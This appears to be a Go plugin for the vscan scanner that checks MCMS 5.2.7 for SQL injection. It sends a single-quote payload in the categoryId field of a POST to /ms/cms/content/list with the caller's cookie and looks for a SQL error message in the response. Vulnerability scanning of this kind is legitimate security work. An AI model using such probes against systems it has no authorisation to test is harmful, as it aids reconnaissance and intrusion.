package mcms

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"net/http"
	"strings"
)

//mcms 5.2.7 /ms/cms/content/list
func Backstage_sqlinject_1(u string,req *http.Request) bool {


	headers:=make(map[string]string)
	//传入Cookie
	headers["Cookie"]=req.Header.Get("Cookie")

	if req, err := pkg.HttpRequset(u+"/ms/cms/content/list", "POST", "categoryId=1'", false, headers); err == nil {
		if strings.Contains(req.Body, "error in your SQL") {
			pkg.GoPocLog(fmt.Sprintf("Found mcms_sql_inject|\"%s\"\n", u+"/ms/cms/content/list|POST:categoryId"))
			return true
		}
	}

	return false
}

